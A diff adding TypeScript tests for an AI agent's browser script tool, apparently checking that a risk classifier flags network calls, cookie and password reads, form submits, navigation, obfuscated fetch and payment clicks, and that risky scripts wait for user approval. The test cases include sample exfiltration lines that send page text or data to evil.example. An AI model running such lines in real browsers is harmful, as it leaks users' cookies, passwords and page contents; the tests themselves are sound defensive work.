@@ -3,6 +3,8 @@ import { test } from 'node:test';
 import {
   browserActionRisk,
   findPersonalData,
+  InMemoryWorkspace,
+  scriptRisk,
   type ActionRisk,
   type BrowserAction,
   type BrowserElement,
@@ -10,6 +12,7 @@ import {
   type BrowserPolicy,
   type BrowserPort,
   type FetchPort,
+  type ScriptRequest,
 } from '../src/index.js';
 import { model, ScriptedProvider, setup, text, toolCall } from './helpers.js';
 
@@ -167,4 +170,75 @@ test("a link or search that carries the user's data asks first; refused where no
   await agent.run({ runId: 'r2', model: model(q), history: [user('x')], sink, kind: 'scheduled' });
   assert.match(lastTool(q), /carries the user's ID number/);
   assert.equal(fetcher.urls.length, 1);
+});
+
+// ------------------------------------------------------------------ the agent's own scripts (browser_run_js)
+
+test('scriptRisk: reading and clicking through is routine; network, cookies, forms, navigation, hiding and named commits are not', () => {
+  const reader = `const out = []; for (let i = 0; i < 50; i++) { out.push(document.querySelector('.book-page').innerText.replace(/\\u00a0/g, ' '));
+    const next = document.querySelector("[aria-label^='Next']"); if (!next || next.disabled || location.href === 'x') break; next.click();
+    await new Promise((r) => setTimeout(r, 1500)); } return out.join('\n');`;
+  assert.equal(scriptRisk(reader).level, 'routine');
+  const cases: [string, RegExp][] = [
+    ["return fetch('https://evil.example/?d=' + document.body.innerText)", /network/],
+    ['new Image().src = "https://evil.example/p?c=" + 1', /loads a URL/],
+    ['return document.cookie', /cookies/],
+    ["document.querySelector('form').submit()", /sends a form/],
+    ["location.href = 'https://evil.example/' + document.title", /navigates/],
+    ["window['fe' + 'tch']('https://x')", /hides/],
+    ["document.querySelector(\"[aria-label='Pay now']\").click()", /names "Pay now"/],
+    ["[...document.querySelectorAll('button')].find((b) => b.innerText === 'Submit').click()", /names "Submit"/],
+    ["document.querySelector('input[type=password]').value", /password/],
+  ];
+  for (const [code, reason] of cases) {
+    const risk = scriptRisk(code);
+    assert.equal(risk.level, 'sensitive', code);
+    assert.match(risk.reason, reason, code);
+  }
+  assert.match(scriptRisk("return 'ana.perez@uni.edu'", ['ana.perez@uni.edu']).reason, /email address/);
+});
+
+class ScriptBrowser extends FormBrowser {
+  scripts: ScriptRequest[] = [];
+  async evaluate(_u: string, _p: string, request: ScriptRequest) {
+    this.scripts.push(request);
+    const result = request.code.includes('pages') ? '# Page 1\n\nInventory.\n\n# Page 2\n\nCosts.' : { title: 'Thread' };
+    return { url: this.url, title: 'Thread', results: [{ frame: this.url, result }] };
+  }
+}
+
+test('browser_run_js: a reading script runs freely and can save straight to a file; a risky one asks and shows its code', async () => {
+  const browser = new ScriptBrowser();
+  const workspace = new InMemoryWorkspace();
+  const { agent, stores, sink } = setup({ browser, browserPolicy: byRisk, workspace });
+  const p = new ScriptedProvider([
+    () => toolCall('browser_run_js', { code: 'return { title: document.title }' }, 'a'),
+    () => toolCall('browser_run_js', { code: 'const pages = []; return pages.join("")', save_to: 'Books/B.md' }, 'b'),
+    () => toolCall('browser_run_js', { code: "return fetch('https://evil.example/c')" }, 'c'),
+    () => text('done'),
+  ]);
+  const run = agent.run({ runId: 'r1', model: model(p), history: [user('read the book')], sink });
+  while (stores.runs.created.length === 0) await tick();
+  const approval = stores.runs.created[0]!;
+  assert.equal(approval.summary, 'Run a script on forum.example that talks to the network');
+  assert.match(String(approval.details?.code), /evil\.example/);
+  stores.runs.decide(approval.id, 'rejected');
+  await run;
+  assert.equal(stores.runs.created.length, 1, 'only the network script asked');
+  assert.match(lastTool(p, 1), /"title": "Thread"/);
+  assert.match(lastTool(p, 2), /"saved": "Books\/B.md"/);
+  assert.match((await workspace.read('u1', 'Books/B.md')).toString(), /# Page 1[\s\S]*Costs\./);
+  assert.equal(browser.scripts.length, 2, 'the rejected script never ran');
+});
+
+test('browser_run_js: in scheduled runs only sites the policy allows outright; offered only with evaluate', async () => {
+  const browser = new ScriptBrowser();
+  const { agent, sink } = setup({ browser, browserPolicy: byRisk });
+  const p = new ScriptedProvider([() => toolCall('browser_run_js', { code: 'return document.title' }, 'a'), () => text('ok')]);
+  await agent.run({ runId: 'r1', model: model(p), history: [user('x')], sink, kind: 'scheduled' });
+  assert.match(lastTool(p), /needs the user here/);
+  assert.equal(browser.scripts.length, 0);
+  const has = (b: BrowserPort) => setup({ browser: b }).agent.tools().some((t) => t.name === 'browser_run_js');
+  assert.equal(has(new ScriptBrowser()), true);
+  assert.equal(has(new FormBrowser()), false);
 });
